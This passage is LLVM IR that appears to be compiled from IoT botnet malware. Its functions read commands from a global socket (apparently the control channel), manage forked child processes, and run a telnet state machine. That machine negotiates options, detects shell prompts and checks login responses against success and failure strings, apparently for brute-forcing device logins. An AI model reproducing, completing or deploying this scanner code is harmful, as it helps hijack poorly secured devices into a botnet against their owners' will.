; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.fd_set, align 8
  %5 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %5 to %struct.timeval*
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  store <2 x i64> <i64 30, i64 0>, <2 x i64>* %5, align 16
  %8 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i64 0, i32 0, i64 0
  %9 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %8) #6, !srcloc !22
  %10 = srem i32 %0, 64
  %11 = zext i32 %10 to i64
  %12 = shl i64 1, %11
  %13 = sdiv i32 %0, 64
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %4, i64 0, i32 0, i64 %14
  %16 = load i64, i64* %15, align 8
  %17 = or i64 %16, %12
  store i64 %17, i64* %15, align 8
  %18 = add nsw i32 %0, 1
  %19 = call i32 @select(i32 %18, %struct.fd_set* nonnull %4, %struct.fd_set* null, %struct.fd_set* nonnull %4, %struct.timeval* nonnull %tmpcast) #6
  %20 = icmp sgt i32 %2, 1
  br i1 %20, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %29
  %.in = phi i32 [ %21, %29 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %30, %29 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %27, %29 ], [ %1, %.lr.ph.preheader ]
  %21 = add nsw i32 %.in, -1
  %22 = load i32, i32* @KadenCommStock, align 4
  %23 = call i64 @recv(i32 %22, i8* nonnull %6, i64 1, i32 0) #6
  %24 = icmp eq i64 %23, 1
  br i1 %24, label %25, label %._crit_edge.loopexit

; <label>:25:                                     ; preds = %.lr.ph
  %26 = load i8, i8* %6, align 1
  %27 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %26, i8* %.01923, align 1
  %28 = icmp eq i8 %26, 10
  br i1 %28, label %._crit_edge.loopexit, label %29

; <label>:29:                                     ; preds = %25
  %30 = add nuw nsw i32 %.024, 1
  %31 = icmp sgt i32 %21, 1
  br i1 %31, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %29, %25
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %27, %29 ], [ %27, %25 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %30, %29 ], [ %.024, %25 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #5

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #6
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #6
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #15
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #6
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #15
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #6, !srcloc !23
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.fd_set* null, %struct.fd_set* nonnull %6, %struct.fd_set* null, %struct.timeval* nonnull %7) #6
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #6
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #6
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #6
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #6
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %21, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #6
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %.._crit_edge_crit_edge, label %.lr.ph.preheader

.._crit_edge_crit_edge:                           ; preds = %3
  %.pre14 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  br label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  %.pre = load i32*, i32** @pids, align 8
  %11 = bitcast i32* %.pre to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %12 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %13 = getelementptr inbounds i32, i32* %.pre, i64 %12
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %12
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = icmp ult i64 %17, %4
  br i1 %18, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.._crit_edge_crit_edge
  %19 = phi i8* [ %.pre14, %.._crit_edge_crit_edge ], [ %11, %._crit_edge.loopexit ]
  %.lcssa = phi i64 [ 0, %.._crit_edge_crit_edge ], [ %4, %._crit_edge.loopexit ]
  %20 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %20, align 4
  tail call void @free(i8* %19) #6
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %21

; <label>:21:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t* nocapture readonly) local_unnamed_addr #1 {
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 1
  %3 = load i32, i32* %2, align 4
  %4 = tail call i8* @inet_ntoa(i32 %3) #6
  ret i8* %4
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8** nocapture readonly) local_unnamed_addr #1 {
  %6 = sext i32 %3 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %2, i8 0, i64 %6, i32 1, i1 false)
  %7 = tail call i32 @read_with_timeout(i32 %0, i32 %1, i8* %2, i32 %3)
  %8 = tail call i32 @contains_string(i8* %2, i8** %4)
  %not. = icmp ne i32 %8, 0
  %.0 = zext i1 %not. to i32
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.fd_set, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  store i64 0, i64* %7, align 8
  %8 = sext i32 %1 to i64
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  store i64 %8, i64* %9, align 8
  %10 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #6, !srcloc !24
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.fd_set* nonnull %5, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* nonnull %6) #6
  %22 = icmp slt i32 %21, 1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %4
  %24 = sext i32 %3 to i64
  %25 = call i64 @recv(i32 %0, i8* %2, i64 %24, i32 0) #6
  %26 = trunc i64 %25 to i32
  br label %27

; <label>:27:                                     ; preds = %4, %23
  %.0 = phi i32 [ %26, %23 ], [ 0, %4 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t* nocapture, i32) local_unnamed_addr #1 {
  %3 = icmp eq i32 %1, 0
  br i1 %3, label %4, label %8

; <label>:4:                                      ; preds = %2
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 0
  %6 = load i32, i32* %5, align 8
  %7 = tail call i32 @close(i32 %6) #6
  br label %8

; <label>:8:                                      ; preds = %4, %2
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 7
  store i32 0, i32* %9, align 8
  %10 = trunc i32 %1 to i8
  %11 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 2
  store i8 %10, i8* %11, align 8
  %12 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 9
  %13 = load i8*, i8** %12, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %13, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t* nocapture) local_unnamed_addr #1 {
  tail call void @advance_state(%struct.telstate_t* %0, i32 0)
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 3
  store i8 1, i8* %2, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_success(i8* %0)
  %3 = icmp eq i32 %2, 0
  br i1 %3, label %4, label %7

; <label>:4:                                      ; preds = %1
  %5 = tail call i32 @contains_fail(i8* %0)
  %6 = icmp ne i32 %5, 0
  br label %7

; <label>:7:                                      ; preds = %1, %4
  %8 = phi i1 [ true, %1 ], [ %6, %4 ]
  %9 = zext i1 %8 to i32
  ret i32 %9
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8** nocapture readonly) local_unnamed_addr #1 {
  br label %3

; <label>:3:                                      ; preds = %3, %2
  %indvars.iv13 = phi i64 [ %indvars.iv.next14, %3 ], [ 0, %2 ]
  %indvars.iv.next14 = add nuw nsw i64 %indvars.iv13, 1
  %4 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv.next14
  %5 = load i8*, i8** %4, align 8
  %6 = icmp eq i8* %5, null
  br i1 %6, label %.preheader, label %3

.preheader:                                       ; preds = %3
  %7 = trunc i64 %indvars.iv13 to i32
  %8 = icmp slt i32 %7, 0
  br i1 %8, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  %sext = shl i64 %indvars.iv13, 32
  %9 = ashr exact i64 %sext, 32
  br label %.lr.ph

; <label>:10:                                     ; preds = %.lr.ph
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %11 = icmp slt i64 %indvars.iv, %9
  br i1 %11, label %.lr.ph, label %._crit_edge.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %12 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv
  %13 = load i8*, i8** %12, align 8
  %14 = tail call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %0, i8* %13) #6
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %10, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %10
  %.09.ph = phi i32 [ 0, %10 ], [ 1, %.lr.ph ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.09 = phi i32 [ 0, %.preheader ], [ %.09.ph, %._crit_edge.loopexit ]
  ret i32 %.09
}

declare i32 @strcasestr(...) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #1 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #6
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #6
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #6
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #10 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #14
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext41 = shl i64 %1, 32
  %5 = ashr exact i64 %sext41, 32
  %6 = icmp sgt i32 %2, 0
  br i1 %6, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %7 = icmp sgt i32 %2, %.1.lcssa
  br i1 %7, label %.lr.ph.1.preheader, label %.critedge.1

.lr.ph.1.preheader:                               ; preds = %.preheader.137
  br label %.lr.ph.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %12, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %8 = sub nsw i64 0, %indvars.iv
  %9 = getelementptr inbounds i8, i8* %4, i64 %8
  %10 = load i8, i8* %9, align 1
  %11 = trunc i64 %indvars.iv to i32
  switch i8 %10, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %12 = add nsw i32 %.130, 1
  %13 = icmp sgt i64 %5, %indvars.iv.next
  br i1 %13, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %11, %.lr.ph ], [ %12, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %14 = sext i32 %.1.lcssa to i64
  %15 = sub nsw i64 0, %14
  %16 = getelementptr inbounds i8, i8* %4, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = icmp eq i8 %17, 58
  br i1 %18, label %19, label %.preheader.137

; <label>:19:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.1:                                         ; preds = %.lr.ph.1.preheader, %.critedge1.1
  %indvars.iv.1 = phi i64 [ %indvars.iv.next.1, %.critedge1.1 ], [ %14, %.lr.ph.1.preheader ]
  %.130.1 = phi i32 [ %24, %.critedge1.1 ], [ %.1.lcssa, %.lr.ph.1.preheader ]
  %20 = sub nsw i64 0, %indvars.iv.1
  %21 = getelementptr inbounds i8, i8* %4, i64 %20
  %22 = load i8, i8* %21, align 1
  %23 = trunc i64 %indvars.iv.1 to i32
  switch i8 %22, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %24 = add nsw i32 %.130.1, 1
  %25 = icmp sgt i64 %5, %indvars.iv.next.1
  br i1 %25, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %23, %.lr.ph.1 ], [ %24, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %26 = sext i32 %.1.lcssa.1 to i64
  %27 = sub nsw i64 0, %26
  %28 = getelementptr inbounds i8, i8* %4, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 62
  br i1 %30, label %19, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %31 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %31, label %.lr.ph.2.preheader, label %.critedge.2

.lr.ph.2.preheader:                               ; preds = %.preheader.238
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.lr.ph.2.preheader, %.critedge1.2
  %indvars.iv.2 = phi i64 [ %indvars.iv.next.2, %.critedge1.2 ], [ %26, %.lr.ph.2.preheader ]
  %.130.2 = phi i32 [ %36, %.critedge1.2 ], [ %.1.lcssa.1, %.lr.ph.2.preheader ]
  %32 = sub nsw i64 0, %indvars.iv.2
  %33 = getelementptr inbounds i8, i8* %4, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = trunc i64 %indvars.iv.2 to i32
  switch i8 %34, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %36 = add nsw i32 %.130.2, 1
  %37 = icmp sgt i64 %5, %indvars.iv.next.2
  br i1 %37, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %35, %.lr.ph.2 ], [ %36, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %38 = sext i32 %.1.lcssa.2 to i64
  %39 = sub nsw i64 0, %38
  %40 = getelementptr inbounds i8, i8* %4, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = icmp eq i8 %41, 37
  br i1 %42, label %19, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %43 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %43, label %.lr.ph.3.preheader, label %.critedge.3

.lr.ph.3.preheader:                               ; preds = %.preheader.339
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.lr.ph.3.preheader, %.critedge1.3
  %indvars.iv.3 = phi i64 [ %indvars.iv.next.3, %.critedge1.3 ], [ %38, %.lr.ph.3.preheader ]
  %.130.3 = phi i32 [ %48, %.critedge1.3 ], [ %.1.lcssa.2, %.lr.ph.3.preheader ]
  %44 = sub nsw i64 0, %indvars.iv.3
  %45 = getelementptr inbounds i8, i8* %4, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = trunc i64 %indvars.iv.3 to i32
  switch i8 %46, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %48 = add nsw i32 %.130.3, 1
  %49 = icmp sgt i64 %5, %indvars.iv.next.3
  br i1 %49, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %47, %.lr.ph.3 ], [ %48, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %50 = sext i32 %.1.lcssa.3 to i64
  %51 = sub nsw i64 0, %50
  %52 = getelementptr inbounds i8, i8* %4, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = icmp eq i8 %53, 36
  br i1 %54, label %19, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %55 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %55, label %.lr.ph.4.preheader, label %.critedge.4

.lr.ph.4.preheader:                               ; preds = %.preheader.440
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.lr.ph.4.preheader, %.critedge1.4
  %indvars.iv.4 = phi i64 [ %indvars.iv.next.4, %.critedge1.4 ], [ %50, %.lr.ph.4.preheader ]
  %.130.4 = phi i32 [ %60, %.critedge1.4 ], [ %.1.lcssa.3, %.lr.ph.4.preheader ]
  %56 = sub nsw i64 0, %indvars.iv.4
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = trunc i64 %indvars.iv.4 to i32
  switch i8 %58, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %60 = add nsw i32 %.130.4, 1
  %61 = icmp sgt i64 %5, %indvars.iv.next.4
  br i1 %61, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %59, %.lr.ph.4 ], [ %60, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %62 = sext i32 %.1.lcssa.4 to i64
  %63 = sub nsw i64 0, %62
  %64 = getelementptr inbounds i8, i8* %4, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = icmp eq i8 %65, 35
  %. = zext i1 %66 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8* nocapture readonly, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.fd_set, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = sext i32 %3 to i64
  %12 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 0
  store i64 %11, i64* %12, align 8
  %13 = sext i32 %4 to i64
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 1
  store i64 %13, i64* %14, align 8
  %15 = add nsw i32 %7, 2
  %16 = icmp slt i32 %15, %6
  br i1 %16, label %.lr.ph, label %.critedge

.lr.ph:                                           ; preds = %8
  %17 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %9, i64 0, i32 0, i64 0
  %18 = srem i32 %0, 64
  %19 = zext i32 %18 to i64
  %20 = shl i64 1, %19
  %21 = sdiv i32 %0, 64
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %9, i64 0, i32 0, i64 %22
  %24 = add nsw i32 %0, 1
  %25 = icmp eq i32 %2, 0
  %26 = icmp sgt i32 %3, 0
  %27 = icmp sgt i32 %4, 0
  %28 = or i1 %26, %27
  br i1 %25, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br i1 %28, label %.lr.ph77.preheader, label %.critedge

